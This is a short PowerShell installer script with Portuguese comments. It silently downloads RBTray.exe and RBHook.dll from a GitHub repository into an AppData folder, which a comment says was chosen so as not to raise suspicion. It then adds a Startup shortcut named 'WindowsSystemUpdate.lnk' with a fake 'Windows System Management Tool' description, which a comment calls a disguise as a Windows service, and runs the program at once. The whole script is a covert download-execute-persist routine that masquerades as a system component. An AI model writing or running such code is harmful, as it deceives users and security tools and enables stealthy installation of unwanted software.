# 1. Definir caminhos (Pasta oficial no AppData para não levantar suspeitas)
$myFolder = "$env:AppData\Questions"
$startupPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Criar a pasta de trabalho se não existir
if (!(Test-Path $myFolder)) { New-Item -ItemType Directory -Path $myFolder | Out-Null }

# 3. Baixar os binários silenciosamente
$urls = @{
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBTray.exe" = "$myFolder\RBTray.exe"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBHook.dll" = "$myFolder\RBHook.dll"
}

foreach ($url in $urls.Keys) {
    Invoke-WebRequest -Uri $url -OutFile $urls[$url]
}

# 4. Criar o atalho no Startup (Disfarçado de serviço do Windows)
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystemUpdate.lnk")
$shortcut.TargetPath = "$myFolder\RBTray.exe"
$shortcut.WorkingDirectory = $myFolder
$shortcut.Description = "Windows System Management Tool"
$shortcut.Save()

# 5. Executar agora mesmo para testar
Start-Process "$myFolder\RBTray.exe"

Write-Host "Instalação concluída! O RBTray está pronto e vai arrancar sozinho no próximo login." -ForegroundColor Green